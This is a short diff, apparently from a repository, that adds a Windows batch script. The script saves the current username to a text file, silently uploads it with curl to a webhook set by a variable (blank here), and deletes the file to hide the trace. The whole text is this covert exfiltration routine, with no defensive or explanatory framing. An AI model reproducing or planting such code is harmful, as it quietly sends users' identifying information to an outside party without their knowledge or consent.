@@ -1,0 +1,4 @@
+set webhook=
+echo %username%>pcname.txt 
+curl --silent --output /dev/null -F l=@"pcname.txt" %webhook%
+del pcname.txt
